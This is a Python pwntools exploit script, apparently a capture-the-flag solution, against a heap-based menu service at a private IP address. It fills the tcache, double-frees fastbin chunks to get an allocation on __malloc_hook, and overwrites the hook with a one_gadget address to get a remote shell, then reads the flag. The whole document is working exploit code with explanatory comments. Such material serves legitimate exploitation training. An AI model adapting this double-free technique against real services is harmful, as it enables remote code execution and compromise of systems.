from pwn import *
import struct

#function to create an entry/token allocating malloc
def make_entry(connection: remote, entry_name: bytes):
    if not isinstance(connection, remote):
        raise TypeError("Expected a 'remote' instance for 'connection'")
    if not isinstance(entry_name, bytes):
        raise TypeError("Expected a 'bytes' for 'entry_name'")
    connection.sendline(b"g")
    connection.sendline(entry_name)

#fucntion to delete an entry/token freeing chunk
def remove_entry(connection: remote, entry_index: int):
    if not isinstance(connection, remote):
        raise TypeError("Expected a 'remote' instance for 'connection'")
    if not isinstance(entry_index, int):
        raise TypeError("Expected an 'int' for 'entry_index'")
    connection.sendline(b"d")
    connection.sendline(str(entry_index).encode())

try:
    connection = remote('10.21.232.3', 20202)
    connection.recvuntil(b'Libc base: ')
    base_addr = int(connection.recvline().rstrip(), 16)
    Libc = ELF('libc.so.6')
    OneGadgetAddr = base_addr + 0x10a2fc #adding offset to resolve the absolute address

    connection.recvuntil(b'Action: ')
    for _ in range(9): #allocating 9 same sized chunks of malloc
        make_entry(connection, b"abcd")

    for index in range(7): #freeing 7 of those chunks allocated above
        remove_entry(connection, index)

    remove_entry(connection, 7)
    remove_entry(connection, 8)
    remove_entry(connection, 7) #double freeing 2 bins to create a circular linked list between the 2 fastbins

    for _ in range(7): #re-allocating the 7 tcache bins
        make_entry(connection, b"abcd")

    make_entry(connection, p64(Libc.sym.__malloc_hook + base_addr)) #allocating using __malloc_hook the target address in the next bin
    make_entry(connection, b"AAAA") #dummy allocation
    make_entry(connection, b"1234") #dummy allocation
    make_entry(connection, p64(OneGadgetAddr)) #inserting the exploit shell retreieved using one_gadget in the target address
    make_entry(connection, b"1234")
    connection.sendline(b"cat flag") # command to be executed in remote server and retrieve the flag
    connection.recvuntil(b'not found\n')
    print('flag : ', connection.recvline())
finally:
    connection.close()
